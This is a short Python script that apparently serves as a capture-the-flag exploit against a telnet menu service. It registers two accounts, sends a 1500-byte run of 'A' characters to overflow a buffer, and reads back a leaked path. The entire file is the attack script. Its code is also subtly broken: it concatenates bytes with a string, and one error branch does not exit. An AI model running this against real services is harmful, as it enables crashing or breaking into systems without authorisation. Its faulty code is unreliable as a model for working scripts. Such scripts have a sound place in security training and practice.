import telnetlib
import sys
usage = "Usage:" + sys.argv[0] + "<IP> <port>"

tnCon = None

def connectTelnet():
    global tnCon
    tnCon = telnetlib.Telnet(host, port)

def read(text):
    tnCon.read_until(text.encode())

def write(text):
    tnCon.write(text.encode() + "\n")

def register2login():
    for i in range(1,3):
        read("4")
        write(str(i))
        read(":")
        write("synisl33t")
        read(":")
        write("synisl33t")

def bufferOverflow():
    read("4")
    write("4")
    read(":")
    write("A"*1500)

def getPath():
    read("4")
    write("3")
    read("\n")
    print(tnCon.read_until("\n".encode()).decode())

def main():
    connectTelnet()
    register2login()
    bufferOverflow()
    getPath()


if __name__ == "__main__":
    if(len(sys.argv) < 3):
        print(usage)
        sys.exit(1)
    host = sys.argv[1]
    try:
        port = int(sys.argv[2])
    except:
        print(usage)
    main()
